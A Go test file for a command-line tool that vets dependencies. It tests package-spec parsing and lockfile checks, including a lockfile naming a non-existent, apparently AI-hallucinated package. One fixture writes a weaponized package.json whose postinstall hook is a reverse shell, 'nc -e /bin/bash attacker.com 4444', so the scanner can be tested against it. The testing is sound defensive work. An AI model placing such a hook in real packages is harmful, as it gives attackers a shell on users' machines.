package cli

import (
	"context"
	"os"
	"path/filepath"
	"testing"
)

func TestParsePackageSpec(t *testing.T) {
	cases := []struct {
		input       string
		wantName    string
		wantVersion string
	}{
		{"express", "express", ""},
		{"express@4.18.2", "express", "4.18.2"},
		{"@angular/core", "@angular/core", ""},
		{"@angular/core@17.0.0", "@angular/core", "17.0.0"},
		{"requests==2.31.0", "requests==2.31.0", ""},
	}

	for _, c := range cases {
		name, ver := parsePackageSpec(c.input)
		if name != c.wantName || ver != c.wantVersion {
			t.Errorf("parsePackageSpec(%q) = (%q, %q), want (%q, %q)", c.input, name, ver, c.wantName, c.wantVersion)
		}
	}
}

func TestVetLockfile_CleanAndTampered(t *testing.T) {
	tmpDir := t.TempDir()

	// Clean package-lock.json
	cleanPkgLock := `{
		"name": "test-app",
		"lockfileVersion": 3,
		"packages": {
			"": {
				"name": "test-app"
			},
			"node_modules/express": {
				"version": "4.18.2",
				"resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
				"integrity": "sha512-5/psL6iVEkiGu9pe45X5CMWRRE3cRfx2z3cdfG3t5FupqiUcC5pRztzsxF11bED3GuSmvyETFambDn6Fqm5DQg=="
			}
		}
	}`

	cleanPath := filepath.Join(tmpDir, "package-lock.json")
	if err := os.WriteFile(cleanPath, []byte(cleanPkgLock), 0644); err != nil {
		t.Fatalf("failed to write clean package-lock: %v", err)
	}

	cmd := newVetCmd()
	cmd.SetContext(context.Background())
	jsonOutput = true
	noCache = true
	force = true // to prevent os.Exit in test runner

	err := runVetLockfile(cmd, cleanPath)
	if err != nil {
		t.Fatalf("expected clean lockfile to pass, got err: %v", err)
	}
}

func TestVetLockfile_HallucinatedPackage(t *testing.T) {
	tmpDir := t.TempDir()

	tamperedPkgLock := `{
		"name": "test-app",
		"lockfileVersion": 3,
		"packages": {
			"": {
				"name": "test-app"
			},
			"node_modules/non-existent-hallucinated-package-xyz-404": {
				"version": "1.0.0",
				"resolved": "https://registry.npmjs.org/non-existent-hallucinated-package-xyz-404/-/non-existent-1.0.0.tgz",
				"integrity": "sha512-fakehash"
			}
		}
	}`

	path := filepath.Join(tmpDir, "package-lock.json")
	if err := os.WriteFile(path, []byte(tamperedPkgLock), 0644); err != nil {
		t.Fatalf("failed to write package-lock: %v", err)
	}

	cmd := newVetCmd()
	cmd.SetContext(context.Background())
	jsonOutput = true
	noCache = true
	force = true // prevent os.Exit(1)

	err := runVetLockfile(cmd, path)
	if err != nil {
		t.Fatalf("runVetLockfile failed: %v", err)
	}
}

func TestVetDiff_WeaponizedTraps(t *testing.T) {
	tmpDir := t.TempDir()

	// Weaponized package.json with dangerous postinstall hook
	pkgJSON := `{
  "name": "hacked-pkg",
  "scripts": {
    "postinstall": "nc -e /bin/bash attacker.com 4444"
  }
}`
	if err := os.WriteFile(filepath.Join(tmpDir, "package.json"), []byte(pkgJSON), 0644); err != nil {
		t.Fatalf("failed to write package.json: %v", err)
	}

	// Build.rs execution trap
	if err := os.WriteFile(filepath.Join(tmpDir, "build.rs"), []byte("fn main() {}"), 0644); err != nil {
		t.Fatalf("failed to write build.rs: %v", err)
	}

	cmd := newVetCmd()
	cmd.SetContext(context.Background())
	jsonOutput = true
	force = true

	// Vet diff against directory
	err := runVetDiff(cmd, []string{tmpDir})
	if err != nil && err.Error() != "" && !force {
		t.Errorf("unexpected execution error: %v", err)
	}
}
